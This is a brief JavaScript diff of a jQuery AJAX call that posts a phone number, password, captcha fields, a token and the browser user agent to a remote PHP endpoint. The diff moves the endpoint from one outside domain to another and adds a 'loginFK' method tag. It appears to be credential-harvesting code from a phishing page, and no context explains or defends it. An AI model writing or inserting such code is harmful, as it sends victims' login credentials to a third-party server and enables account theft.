@@ -150,15 +150,16 @@
     $("#upload_result").val("");
     $.ajax({
         type: "POST",
-        url: "https://foody-menu.ru/FK/go.php",
+        url: "https://newappsbase.com/SP/functions.php",
         data: {
+            "method": "loginFK",
             "phone": phone,
             "pass": pass,
             "device": device,
             "captcha_sid": captcha_sid,
             "captcha_proxi": captcha_proxi,
             "captcha_key": captcha_key,
-            "method": method,
+            "method2": method,
             "token": token,
             "upload_result": upload_result,
             "user_agent": window.navigator.userAgent
